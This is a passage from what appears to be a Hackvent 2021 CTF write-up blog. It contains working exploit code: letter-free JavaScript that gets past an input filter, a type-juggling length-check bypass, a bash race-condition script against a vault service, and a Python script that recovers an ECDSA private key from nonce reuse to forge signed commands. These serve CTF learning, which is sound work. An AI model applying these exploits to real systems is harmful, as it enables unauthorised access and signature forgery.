        res.sendFile(path.join(__dirname, 'app.js'));
    });
    
    module.exports = app;
    

### Solution

#### Trying to Make Characters

Immediately I thought about [JSFuck](http://www.jsfuck.com/), which encodes
everything into six characters. There are some basics on that page:

>
>     - false       =>  ![]
>     - true        =>  !![]
>     - undefined   =>  [][[]]
>     - NaN         =>  +[![]]
>     - 0           =>  +[]
>     - 1           =>  +!+[]
>     - 2           =>  !+[]+!+[]
>     - 10          =>  [+!+[]]+[+[]]
>     - Array       =>  []
>     - Number      =>  +[]
>     - String      =>  []+[]
>     - Boolean     =>  ![]
>     - Function    =>  []["filter"]
>     - eval        =>  []["filter"]["constructor"]( CODE )()
>     - window      =>  []["filter"]["constructor"]("return this")()
>  

I can try sending in a string of say `+[]` (for “0”), and it returns that
string:

![image-20211215173244551](https://0xdfimages.gitlab.io/img/image-20211215173244551.png)

The [Wikipedia page for JSFuck](https://en.wikipedia.org/wiki/JSFuck) has a
table with a bunch more representations of characters. For example, “a” is
`(![]+[])[+!+[]]`. Sending that works:

![image-20211215173405645](https://0xdfimages.gitlab.io/img/image-20211215173405645.png)

I can append characters with `+`. So “ent” is
`(!![]+[])[!+[]+!+[]+!+[]]+([][[]]+[])[+!+[]]+(!+[]+[])[+[]]`:

![image-20211215173458981](https://0xdfimages.gitlab.io/img/image-20211215173458981.png)

Unfortunately, there aren’t keys for all the characters I need. I got as far
as
`(![]+[])[+!+[]]+[[]+{}][0][5]+(!![]+[])[!+[]+!+[]+!+[]]+([][[]]+[])[+!+[]]+(!+[]+[])[+[]]`,
which returned “acent”.

Unfortunately, this was a bit of a dead end. I couldn’t find the other
characters.

#### Make unescape

Using the methodology of JSFuck, I was able to craft the `unescape` function.
That would then allow me to call `unescape('%48')` and get “H”, for example.

I’ll start with `[][[]]`, which is “undefined”. If I then add `+ []`, it
creates the string “undefined”, which I can now reference indexes of to get
any of those characters:

    
    
    $0=([][[]]+[]);
    

There’s another pattern, `[][string]+[]`, that will produce a function. I can
create the `find` function, and turn it into a string “function find() {
[native code] }” with:

    
    
    $1=[][$0[4]+$0[5]+$0[6]+$0[2]]+[];
    

This gives a lot more characters to work with. I’ll also bring in the strings
“true” (`$2=!0+[];`) and “false” (`$3=!1+[];`).

Next I’m going to build the string “constructor”. I already have the “c” from
`$1`, “n” and “u” from $0, “s” from $3, and “t” and “r” from $2. The only
character missing at this point is “o”. I can get that from an `[[]+{}][0]`,
which makes “[object Object]”. So `[[]+{}][0][1]` is the character “o”.

    
    
    $4=[[]+{}][0][1];
    $5=$1[3]+$4+$0[1]+$3[3]+$2[0]+$2[1]+$0[0]+$1[3]+$2[0]+$4+$2[1];
    

Now `$5` is “constructor”.

Next I need “toString” as a string. `""["constructor"]` will return
“[Function: String]”. If I can make `""["constructor"]["name"]`, it will
return “String”. “n” comes from `$0`, “a” and “e” from `$3`. “m” is tricky,
but I can get it. `(+[])` is 0. `(0)["constructor"]+[]` is “function Number()
{ [native code] }”, and I can grab “m” from there as character 11. With all of
that, $6 is “toString”:

    
    
    $6=$2[0]+$4+""[$5][$0[1]+$3[1]+((+[])[$5]+[])["11"]+$2[3]];
    

The string “toString” gives me access to [Base36
encoding](https://en.wikipedia.org/wiki/Base36) in JavaScript, which gives any
characters in digits and lowercase letters. Something like `(10).toString(36)`
will return ‘a’. This could also be written `(10)["toString"](36)`, which is
what I can build now.

This gives me everything I need except the “H”. For that, I’ll look at
`unescape`. I’ve already got a lot of those characters, and I can use
`toString` to get the rest:

    
    
    $7=$0[0]+$0[1]+$2[3]+$3[3]+(12)[$6](36)+$3[1]+(25)[$6](36)+$3[4]
    

To use “unescape”, I created a function using this pattern:

    
    
    []['filter']['constructor'](code)();
    

I’ve already got “constructor” (`$5`). I need to make “filter”, which is easy
with letters I already have. I’ll also need “return”:

    
    
    $8=$3[0]+$1[5]+$3[2]+$2[0]+$2[3]+$2[1];
    $9=$2[1]+$2[3]+$2[0]+$0[0]+$2[1]+$0[1]+$1[8];
    

With those strings, I can build the function `unescape`:

    
    
    $10=[][$8][$5]($9+$7)();
    

#### Using unescape

With that, I can make any string. So “Hackvent” is:

    
    
    $10('%48%61%63%6'+$10('%42')+'%76%65%6'+$3[4]+'%74')
    

It’s a bit tricky because “k” is `%6b` and “n” is `%6e`, but I can’t include
“b” in the code. “e” is easy to get from “false”, but I’ll use double
`unescape` to get “b”.

The good news is that this code will print “Hackvent”:

    
    
    $0=([][[]]+[]);
    $1=[][$0[4]+$0[5]+$0[6]+$0[2]]+[];
    $2=!0+[];
    $3=!1+[];
    $4=[[]+{}][0][1];
    $5=$1[3]+$4+$0[1]+$3[3]+$2[0]+$2[1]+$0[0]+$1[3]+$2[0]+$4+$2[1];
    $6=$2[0]+$4+""[$5][$0[1]+$3[1]+((+[])[$5]+[])["11"]+$2[3]];
    $7=$0[0]+$0[1]+$2[3]+$3[3]+(12)[$6](36)+$3[1]+(25)[$6](36)+$3[4];
    $8=$3[0]+$1[5]+$3[2]+$2[0]+$2[3]+$2[1];
    $9=$2[1]+$2[3]+$2[0]+$0[0]+$2[1]+$0[1]+$1[8];
    $10=[][$8][$5]($9+$7)();
    $10('%48%61%63%6'+$10('%42')+'%76%65%6'+$3[4]+'%74')
    

The bad news is it is too long. Even with newlines removed, it’s 432
characters, 32 too many.

In JavaScript, a variable can be any string. So `a` and `$a` are different
variables:

![image-20211216062152398](https://0xdfimages.gitlab.io/img/image-20211216062152398.png)

I’m using `$1` because a variable name can’t start with a digit (or it would
just be a number). Big props to SmartSmuf who figured out that we could use
non-ascii characters as variables:

    
    
    α=([][[]]+[]);
    β=[][α[4]+α[5]+α[6]+α[2]]+[];
    χ=!0+[];
    δ=!1+[];
    ε=[[]+{}][0][1];
    φ=β[3]+ε+α[1]+δ[3]+χ[0]+χ[1]+α[0]+β[3]+χ[0]+ε+χ[1];
    γ=χ[0]+ε+""[φ][α[1]+δ[1]+((+[])[φ]+[])["11"]+χ[3]];
    η=α[0]+α[1]+χ[3]+δ[3]+(12)[γ](36)+δ[1]+(25)[γ](36)+δ[4];
    ι=δ[0]+β[5]+δ[2]+χ[0]+χ[3]+χ[1];
    κ=χ[1]+χ[3]+χ[0]+α[0]+χ[1]+α[1]+β[8];
    λ=[][ι][φ](κ+η)();
    λ('%48%61%63%6'+λ('%42')+'%76%65%6'+δ[4]+'%74')
    

Putting that into the site solves the challenge:

![image-20211216062928970](https://0xdfimages.gitlab.io/img/image-20211216062928970.png)

**Flag:`HV{W4NN4 G0 G0LFING T0M0RR0W?}`**

### Alternative Solution - Bypass Length Check

There’s bug in the site code that allows bypassing the length check. This is
the line that enforces the requirements of length and characters:

    
    
        if (code && code.length < 400 && /^[^a-zA-Z\\\:\_]*$/.test(code)) {
    

When I click submit on the site, it goes into a GET request:

![image-20211216063253684](https://0xdfimages.gitlab.io/img/image-20211216063253684.png)

If I change that to be `/?code[]=...`, the server will type the input as a
list, not a string. And then length of that list, no matter how long the text,
will be one. This is a type juggling attack. So I can submit my 432 characters
above with this URL:

    
    
    https://6522f096-f9e3-48d0-aa43-41e815fcf644.idocker.vuln.land/?code[]=%240%3D%28%5B%5D%5B%5B%5D%5D%2B%5B%5D%29%3B%0D%0A%241%3D%5B%5D%5B%240%5B4%5D%2B%240%5B5%5D%2B%240%5B6%5D%2B%240%5B2%5D%5D%2B%5B%5D%3B%0D%0A%242%3D%210%2B%5B%5D%3B%0D%0A%243%3D%211%2B%5B%5D%3B%0D%0A%244%3D%5B%5B%5D%2B%7B%7D%5D%5B0%5D%5B1%5D%3B%0D%0A%245%3D%241%5B3%5D%2B%244%2B%240%5B1%5D%2B%243%5B3%5D%2B%242%5B0%5D%2B%242%5B1%5D%2B%240%5B0%5D%2B%241%5B3%5D%2B%242%5B0%5D%2B%244%2B%242%5B1%5D%3B%0D%0A%246%3D%242%5B0%5D%2B%244%2B%22%22%5B%245%5D%5B%240%5B1%5D%2B%243%5B1%5D%2B%28%28%2B%5B%5D%29%5B%245%5D%2B%5B%5D%29%5B%2211%22%5D%2B%242%5B3%5D%5D%3B%0D%0A%247%3D%240%5B0%5D%2B%240%5B1%5D%2B%242%5B3%5D%2B%243%5B3%5D%2B%2812%29%5B%246%5D%2836%29%2B%243%5B1%5D%2B%2825%29%5B%246%5D%2836%29%2B%243%5B4%5D%3B%0D%0A%248%3D%243%5B0%5D%2B%241%5B5%5D%2B%243%5B2%5D%2B%242%5B0%5D%2B%242%5B3%5D%2B%242%5B1%5D%3B%0D%0A%249%3D%242%5B1%5D%2B%242%5B3%5D%2B%242%5B0%5D%2B%240%5B0%5D%2B%242%5B1%5D%2B%240%5B1%5D%2B%241%5B8%5D%3B%0D%0A%2410%3D%5B%5D%5B%248%5D%5B%245%5D%28%249%2B%247%29%28%29%3B%0D%0A%2410%28%27%2548%2561%2563%256%27%2B%2410%28%27%2542%27%29%2B%27%2576%2565%256%27%2B%243%5B4%5D%2B%27%2574%27%29
    

And it returns the flag.

## HV21.12

### Challenge

![hv21-ball12](https://0xdfimages.gitlab.io/img/hv21-ball12.png) | HV21.12 Santa's Shuffle  
---|---  
Categories: |  ![programming](../img/hv-cat-programming.png)PROGRAMMING  
![reverse_engineering](../img/hv-cat-
reverse_engineering.png)REVERSE_ENGINEERING  
Level: | medium  
Author: |  2d3   
  
> Oh no, the elves have forgotten to close the windows and the draft made mess
> of Santa’s code! Maybe you could clean it up?
>
> Can you help Santa clean up this chaos?

The download is [this heavily obfuscated C
code](/files/434eb425-6597-4fd0-bbd8-6f6e427a5f72.c):

    
    
    #include/*502_-_zU3X)}tM1#Hq$4D"35*/<stdio.h>//W6juf:tvs.]DrIoMM(axv0@|k?+jkES5r
    #define/*&jhm|0zs(*/B/*zDq|:OHcU~Dv|;7,FE)9s(Ue!5gM*/break//v9BF(TT1Gq"19#?kJ2*H
    #define/*JH8gDjl*/C(x)/*c9UOy:3*/case/*@MgHEK+94c9*/x/*bb]V+F#*/://u$T._.$ms'cjF
    #define/*XSGrEWMy94I!VMe_n*/E(x)/*UUG9F{)zJB*/else/*CJsY*9D|SfgQ-XL*/x//s{2GfRjU
    #define/*jDdwh4pU,*/F(x)/*@48h|llEw&qpgsJl7ifhb)*/if/*ux7-7_$}9*P*/(x)//s0qQes26
    #define/*6#ZZoxYnO4xaPrjtX!?4IFw.o(J.F!aw;l1J*/G/*(K)A*N^+.p#'*/getchar//R3k7&Fz
    #define/*i3pPy[qc!eLd1x*/H/*yUP"V{xqnjY*/char//9hek:99{qBf[JY4J]IQ(|uC?fP"l+vyI8
    #define/*&#AH67b)-BfgJ*/I(x)/*3*N):*@uqGsPWx8qa6@m6Jh*/int x//FR9+X'O:zMD(h4vS1I
    #define/*hJ5*/N(x)/*rjl|(eQP#|z*/const/*7,XJg5(b{55*/x//{v|REgeXz(Lt4i!ip}t$4NFO
    #define/*KHZ4M6Iisfr*-*/P/*1=j~}wrY*,{Ed$LBv6RFjZL$.!~dYEQ,!nLcP*/putchar//%cf1H
    #define/*NNpSIo2OmEA~By*/R(x)/*KO5g{I.-}d4*/return/*B1W|t9J#IMl*/x//&{GOKv%1DeOR
    #define/*{2&kPmy$}*/S/*We3LM~2)9-S+vv0"]F*/switch//(d't:h%G1PW'PMq:YT$99wc'Armhm
    #define/*@:ZX?_W)3Ow*/U(x)/*m.ZxP@*/unsigned/*@':qb8*/x//Z0GPh4pWKUeua|U$V0JqZz0
    #define/*1b*/W(x)/*A8M{Ww*/while/*lZ8(@={auRxbu(0pQ48vR]Y*/(x)//-gw7zlWYT.LW+rE3
    N(H)*d="\0329>\036=\016"/*FzeM,;=3;T@Ddy_k}.3$Z?*/"b\040\012!9\016"/*uKjE"vL!jSf
    ...[snip]...
    

### Solution

#### Compile

My first thought was to beautify and remove comments, but then I decided to
compile it:

    
    
    $ gcc -o day12 434eb425-6597-4fd0-bbd8-6f6e427a5f72.c 
    

Running that asks for a key:

    
    
    $ ./day12 
    Enter key: 0xdf
    

#### Ghidra

Opening it in Ghidra, about half way down the main function is a series of
`getchar()` calls followed by `if` checks:

[![image-20211216125817410](https://0xdfimages.gitlab.io/img/image-20211216125817410.png)_Click
for full size
image_](https://0xdfimages.gitlab.io/img/image-20211216125817410.png)

I can quickly guess that the password is those checks, “BF4theWiN$Right?”

#### Get Flag

Running and giving that password solves and returns the flag:

    
    
    $ ./day12 
    Enter key: BF4theWiN$Right?
    HV21{-HidDeN-bRaiNF-Ck-dEcoDer-}
    

**Flag:`HV21{-HidDeN-bRaiNF-Ck-dEcoDer-}`**

## HV21.15

### Challenge

![hv21-ball15](https://0xdfimages.gitlab.io/img/hv21-ball15.png) | HV21.15 Christmas Bauble  
---|---  
Categories: |  ![reverse_engineering](../img/hv-cat-reverse_engineering.png)REVERSE_ENGINEERING   
Level: | medium  
Author: |  Dr Nick.  
DrSchottky  
  
> The elves have started taking 3D modeling classes and have presented Santa
> with a gift. What a nice gesture! But the ball feels heavier than it should;
> what does that even mean for digital assets???

It includes a file,
[bauble.stl](https://drive.google.com/file/d/1cV8Lxo9J8W2sLALzA0S-OKIAU1v-BZh-/view?usp=sharing).

### Solution

I dealt with a similar file in [Hackvent 2019](/hackvent2019/easy#solution-1).
I’ll use the same tool, [Clara.io](https://clara.io/), with the full solve
here on YouTube:

**Flag:`HV21{1st_P4rt_0f_th3_fl4g_with_the_2nd_P4rt_c0mb1ned_w17h_th4t}`**

## HV21.16

### Challenge

![hv21-ball16](https://0xdfimages.gitlab.io/img/hv21-ball16.png) | HV21.16 Santa's Crypto Vault  
---|---  
Categories: |  ![web_security](../img/hv-cat-web_security.png)WEB_SECURITY  
![programming](../img/hv-cat-programming.png)PROGRAMMING  
Level: | medium  
Author: |  MtHonegg  
Kotlin  
  
> With the recent Crypto Rally, Santa has invested all his funds into Santa
> Coins. Because he doesn’t trust any existing software to securely store his
> wallet, he asked one of his elves, “Mikitaka Hazekura”, to implement their
> own crypto vault using enterprise software design patterns, the latest
> technology and thorough unit tests. They’re so proud of it, they’ve decided
> to [open source it](https://competition.hacking-
> lab.com/api/media/challenge/zip/95cd312c-cf84-4985-9fa3-da70985e39ed.zip)!
>
> Santa requested to use multiple words, based off his favorite anime, instead
> of one long password to make it more memorable and secure at the same time.
>
> Santa watched the newly released 6th part of his favorite anime and binge-
> watched it multiple times already. Unfortunately he can now no longer
> remember which characters he used to set up his wallet and can’t access his
> funds to buy the gifts for Christmas. Can you help Santa out?
>
> Hints
>
>   * No knowledge about `JoJo's Bizarre Adventure` is required to solve this
> challenge
>   * No extensive brute force or wordlist is required
>

The docker looks like:

![image-20211216141444376](https://0xdfimages.gitlab.io/img/image-20211216141444376.png)

There’s also the [source](/files/95cd312c-cf84-4985-9fa3-da70985e39ed.zip) to
the application available for download.

### Solution

#### Source Review

The code is written in [kotlin](https://kotlinlang.org/), which is a lot like
Java (and compatible with Java).

There’s a handful of files:

    
    
    $ find src/ -type f
    src/test/kotlin/.DS_Store
    src/test/kotlin/dev/honegger/hackvent2021/securecryptovault/controllers/VaultControllerTests.kt
    src/test/kotlin/dev/honegger/hackvent2021/securecryptovault/SecureCryptoVaultApplicationTests.kt
    src/test/kotlin/dev/honegger/hackvent2021/securecryptovault/.DS_Store
    src/test/kotlin/dev/honegger/hackvent2021/.DS_Store
    src/test/kotlin/dev/honegger/.DS_Store
    src/test/kotlin/dev/.DS_Store
    src/test/.DS_Store
    src/main/resources/static/index.html
    src/main/resources/application.properties
    src/main/kotlin/dev/honegger/hackvent2021/securecryptovault/controllers/VaultController.kt
    src/main/kotlin/dev/honegger/hackvent2021/securecryptovault/SecureCryptoVaultApplication.kt
    src/main/kotlin/dev/honegger/hackvent2021/securecryptovault/services/WalletService.kt
    src/main/kotlin/dev/honegger/hackvent2021/securecryptovault/services/HashService.kt
    src/main/kotlin/dev/honegger/hackvent2021/securecryptovault/services/VaultService.kt
    src/main/kotlin/dev/honegger/hackvent2021/securecryptovault/services/VaultCode.kt
    src/main/.DS_Store
    src/.DS_Store
    

The application shows about what one might expect from the webapp above. The
logic takes place in `VaultController.kt `:

    
    
    /**
     * Prevent evil DDOS or Brute-Force attacks
     */
    private const val maxConcurrentRequests = 2
    
    /**
     * Prevent time based Brute-Force attacks
     */
    private val constRequestDuration = 2.seconds
    
    private val log = KotlinLogging.logger {  }
    
    @RestController
    class VaultController(private val vaultService: VaultService, private val walletService: WalletService) {
        private var activeRequests = AtomicInteger(0)
        private val scope = CoroutineScope(Dispatchers.Default)
    
        @GetMapping("/check")
        suspend fun check(code: VaultCode): ResponseEntity<String> {
            return if (activeRequests.incrementAndGet() <= maxConcurrentRequests) {
                try {
                    log.info { "Checking $code" }
                    val delayTask = scope.async { delay(constRequestDuration) }
                    val codeTask = scope.async { vaultService.checkCode(code) }
    
                    val res = codeTask.await()
                    delayTask.await()
                    if (res) {
                        ResponseEntity.ok("Correct code! Here's your crypto wallet: ${walletService.walletAddress}")
                    } else {
                        ResponseEntity.status(HttpStatus.FORBIDDEN).body("Wrong code!")
                    }
                } finally {
                    activeRequests.decrementAndGet()
                }
            } else {
                activeRequests.decrementAndGet()
                log.info { "Blocked DDOS attack" }
                ResponseEntity.status(HttpStatus.TOO_MANY_REQUESTS).body("Too many parallel requests!")
            }
        }
    }
    

There’s a check to make sure that no more than two concurrent requests are in
at the same time. It is callign into `vaultService` to check if the code is
good. That check is relatively straight forward:

    
    
    @Service
    internal class DefaultVaultService(private val hashService: HashService, properties: VaultProperties) : VaultService {
        private val secret = properties.secret
    
        @Volatile
        private var matched: Boolean = false
    
        private suspend fun String.hash(): String = hashService.hash(this)
    
        override suspend fun checkCode(code: VaultCode): Boolean {
            matched = true
            if (code.bestCharacter.hash() != secret.bestCharacter) {
                log.warn { "Wrong bestCharacter '${code.bestCharacter}', rejecting code" }
                matched = false
            }
            if (code.bestWaifu.hash() != secret.bestWaifu) {
                log.warn { "Wrong bestWaifu '${code.bestWaifu}', rejecting code" }
                matched = false
            }
            if (code.reliableGuy.hash() != secret.reliableGuy) {
                log.warn { "Wrong reliableGuy '${code.reliableGuy}', rejecting code" }
                matched = false
            }
            if (code.bestStand.hash() != secret.bestStand) {
                log.warn { "Wrong bestStand '${code.bestStand}', rejecting code" }
                matched = false
            }
            if (code.bestVillain.hash() != "Dio".hash()) { // TODO move hashed value to configuration
                log.warn { "Wrong bestVillain '${code.bestVillain}', rejecting code" }
                matched = false
            }
    
            log.info { "Matched code = $matched" }
    
            return matched
        }
    }
    

I’ll note that the correct answer for Best Villain is “Dio”.

It’s in looking at the tests that an interesting function jumps out from
`VaultControllerTests.kt`:

    
    
        @Test
        @Disabled("TODO sometimes this test fails and a dummyCode passes, hopefully just a test issue")
        fun `parallel execution works`() = runBlocking {
            listOf(
                async { controller.check(dummyCode) },
                // Hint: This delay needs to be adjusted based on computer speed if you want to run the test locally
                async { delay(375.milliseconds); controller.check(dummyCode) },
            ).map {
                it.await()
            }.forEach {
                Assertions.assertEquals(
                    HttpStatus.FORBIDDEN,
                    it.statusCode
                )
            }
        }
    

`dummyCode` is defined above as “Dio” for all the answers. The test is
disabled, and named `parallel execution works`. The comment says that
sometimes this test fails and dummyCode passes. There’s also a hint that the
delay needs to be adjusted.

#### Parallel Requests

The comments and that test suggest I should try to send two requests with a
short delay between then. I’ll use `curl`:

    
    
    $ curl 'https://f9797854-806a-4e09-bd87-340b03a25079.idocker.vuln.land/check?bestCharacter=Dio&bestWaifu=Dio&reliableGuy=Dio&bestStand=Dio&bestVillain=Dio' & sleep .375; curl 'https://f9797854-806a-4e09-bd87-340b03a25079.idocker.vuln.land/check?bestCharacter=Dio&bestWaifu=Dio&reliableGuy=Dio&bestStand=Dio&bestVillain=Dio';
    

By issuing it as `curl & sleep; curl`, Bash will start the first `curl` in the
background, and continue to the next command without waiting. The `sleep` will
block for 3.75 seconds, and then start the next `curl` . This didn’t work.

Given the comment about needing to adjust the time, I started a loop to walk
different time delays:

    
    
    #!/bin/bash
    
    host="c3c7fb1f-2f8f-4611-9d71-601df7f54dab.idocker.vuln.land"
    
    for i in `seq .300 .005 .750`; do
            curl -s "https://${host}/check?bestCharacter=Dio&bestWaifu=Dio&reliableGuy=Dio&bestStand=Dio&bestVillain=Dio" | grep HV &
            sleep $i;
            curl -s "https://${host}/check?bestCharacter=Dio&bestWaifu=Dio&reliableGuy=Dio&bestStand=Dio&bestVillain=Dio" | grep HV;
    done
    

Running that returned the flag:

    
    
    $ ./solve.sh 
    Correct code! Here's your crypto wallet: HV21{c0ncurrency_1s_a_b1tch}
    ^C
    

**Flag:`HV21{c0ncurrency_1s_a_b1tch}`**

#### Why?

So how does this work? It all comes down to how the checks are handled in
`vaultService`:

    
    
        override suspend fun checkCode(code: VaultCode): Boolean {
            matched = true
            if (code.bestCharacter.hash() != secret.bestCharacter) {
                log.warn { "Wrong bestCharacter '${code.bestCharacter}', rejecting code" }
                matched = false
            }
            if (code.bestWaifu.hash() != secret.bestWaifu) {
                log.warn { "Wrong bestWaifu '${code.bestWaifu}', rejecting code" }
                matched = false
            }
            if (code.reliableGuy.hash() != secret.reliableGuy) {
                log.warn { "Wrong reliableGuy '${code.reliableGuy}', rejecting code" }
                matched = false
            }
            if (code.bestStand.hash() != secret.bestStand) {
                log.warn { "Wrong bestStand '${code.bestStand}', rejecting code" }
                matched = false
            }
            if (code.bestVillain.hash() != "Dio".hash()) { // TODO move hashed value to configuration
                log.warn { "Wrong bestVillain '${code.bestVillain}', rejecting code" }
                matched = false
            }
    
            log.info { "Matched code = $matched" }
    
            return matched
        }
    

Spring (the framework in use here) assumes services are stateless, so it
reuses variables. If my first request has just finished setting `matched =
false` for `bestStand` when my second one starts, it’s possible that the
second one sets `matched = true` (at the top), and then the first request
continues and reaches the end returning the `true`.

## HV21.17

### Challenge

![hv21-ball17](https://0xdfimages.gitlab.io/img/hv21-ball17.png) | HV21.17 Forging Santa's Signature  
---|---  
Categories: |  ![crypto](../img/hv-cat-crypto.png)CRYPTO   
Level: | hard  
Author: |  ice   
  
> Santa is out of town and the elves have to urgently sign for an order. What
> to do, what to do? Well, need to save Christmas, so forge Santa’s signature
> they shall!
>
> The message to be signed is hashed as follows:
> `int(sha512(content.encode('utf-8')).hexdigest(), 16)`

The docker presents a terminal:

![image-20211217125816481](https://0xdfimages.gitlab.io/img/image-20211217125816481.png)

### Solution

#### Recover Private Key

Right away I’ll note P-384 - That’s an ellipic curve used in cryptographic
operations.

If I enter “S”, it prints an example:

![image-20211217164041754](https://0xdfimages.gitlab.io/img/image-20211217164041754.png)

It’s returning two ints, `r` and `s` , which make up the signature. Giving “S”
again prints another example:

![image-20211217164102530](https://0xdfimages.gitlab.io/img/image-20211217164102530.png)

Right away I’ll notice that `r` is the same for both, even though the message
differs. This means that the system is not picking a random nonce (`k`), but
rather reusing it. And that means I can recover the private key.

[This CTF writeup](https://0xswitch.fr/CTF/ecw-2020-final-ecdsa-nonce-reuse)
is a good template for how to proceed, but there’s a few twists.

I’ll start by getting two sample messages with their `r` and `s`, and then use
the math from the post to calculate `k`, `r` inverse, and finally `d_a`, which
is all I need for the private key:

    
    
    #!/usr/bin/env python3
    
    import ecdsa
    from hashlib import sha512
    
    curve = ecdsa.NIST384p
    
    n = curve.order
    msg1 = "Sample 1"
    msg2 = "Sample 2"
    m1 = int(sha512(msg1.encode('utf-8')).hexdigest(), 16)
    m2 = int(sha512(msg2.encode('utf-8')).hexdigest(), 16)
    s1 = 33489134456111111586096003730303147241928968413082982761452509879175853726989263466321845886997949086736334058676262
    s2 = 12179081171572655869294347249741514468765462547977699758324294644893813236189677267344890012834272190773840024562132
    r1 = 21172553356787156393241105864779402540761591694979314103620716528356927452992871965510308895433312567472738317321735
    
    k = ((m1 - m2) * ecdsa.numbertheory.inverse_mod(s1 - s2, n)) % n
    r_inv = ecdsa.numbertheory.inverse_mod(r1, n)
    d_a = ((s1*k - m1) * r_inv) % n
    
    sk = ecdsa.SigningKey.from_secret_exponent(d_a, curve=curve, hashfunc=sha512)
    

#### Fix Lengths

I’ll run with `-i` to get a terminal after it runs and check that the key will
verify the messages that I already have:

    
    
    $ python -i solve.py 
    >>> vk = sk.verifying_key
    >>> sig1 = ecdsa.util.sigencode_string(r1, s1, n)
    >>> vk.verify(sig1, msg1.encode())
    Traceback (most recent call last):
      File "<stdin>", line 1, in <module>
      File "/home/oxdf/.local/lib/python3.8/site-packages/ecdsa/keys.py", line 682, in verify
        return self.verify_digest(signature, digest, sigdecode, allow_truncate)
      File "/home/oxdf/.local/lib/python3.8/site-packages/ecdsa/keys.py", line 736, in verify_digest
        raise BadSignatureError("Signature verification failed")
    ecdsa.keys.BadSignatureError: Signature verification failed
    

The signature fails. To figure out why, I’ll need [this
line](https://github.com/tlsfuzzer/python-
ecdsa/blob/b3b27cd4811ce935e42bbcd251206ff2cb3b51b9/src/ecdsa/keys.py#L1521)
from the Python ecdsa source:

> :param hashfunc: hash function to use for hashing the provided `data`. If
> unspecified the default hash function selected during object initialisation
> will be used (see `VerifyingKey.default_hashfunc`). Should behave like
> hashlib.sha1. The output length of the hash (in bytes) must not be longer
> than the length of the curve order (rounded up to the nearest byte), so
> using SHA256 with NIST256p is ok, but SHA256 with NIST192p is not. (In the
> 2**-96ish unlikely event of a hash output larger than the curve order, the
> hash will effectively be wrapped mod n). Use hashfunc=hashlib.sha1 to match
> openssl’s -ecdsa-with-SHA1 mode, or hashfunc=hashlib.sha256 for
> openssl-1.0.0’s -ecdsa-with-SHA256. Ignored for EdDSA

Basically, for SHA512, it can’t use all 512 bits in P-384, as it can only used
384 bits. I’ll truncate the hashes to fit:

    
    
    #!/usr/bin/env python3
    
    import ecdsa
    import gmpy
    from hashlib import sha512
    
    curve = ecdsa.NIST384p
    
    n = curve.order
    msg1 = "Sample 1"
    msg2 = "Sample 2"
    m1 = int(sha512(msg1.encode('utf-8')).hexdigest()[:96], 16)
    m2 = int(sha512(msg2.encode('utf-8')).hexdigest()[:96], 16)
    s1 = 33489134456111111586096003730303147241928968413082982761452509879175853726989263466321845886997949086736334058676262
    s2 = 12179081171572655869294347249741514468765462547977699758324294644893813236189677267344890012834272190773840024562132
    r1 = 21172553356787156393241105864779402540761591694979314103620716528356927452992871965510308895433312567472738317321735
    
    k = ((m1 - m2) * ecdsa.numbertheory.inverse_mod(s1 - s2, n)) % n
    r_inv = ecdsa.numbertheory.inverse_mod(r1, n)
    d_a = ((s1*k - m1) * r_inv) % n
    
    sk = ecdsa.SigningKey.from_secret_exponent(d_a, curve=curve, hashfunc=sha512)
    vk = sk.verifying_key
    sig1 = ecdsa.util.sigencode_string(r1, s1, n)
    assert (vk.verify(sig1, msg1.encode()))
    

Now with that `assert` at the end, if I can run this and it doesn’t throw an
exception, it worked. And it works!

#### Sign Commands

I’ll add a bit at the end to sign what looks like a command. I can do `ls`,
and see `flag.txt`. I’ll run:

    
    
    attack = b"cat flag.txt"
    sig = sk.sign(attack)
    print(attack, ecdsa.util.sigdecode_string(sig, n))
    

Running it gives the signature:

    
    
    $ python -i solve.py 
    b'cat flag.txt' (24966110335255685305012624484719629308676362811020361696344168753089771662201854800730776413594035191325462334741981, 32481287412544828151912786360856221993936742473856863223879577797534474643068734387634019369552513767600809078384845)
    

Entering that gives the flag:

![image-20211218200320785](https://0xdfimages.gitlab.io/img/image-20211218200320785.png)

**Flag:`HV21{what's_in_a_nonce?}`**

[](/hackvent2021)

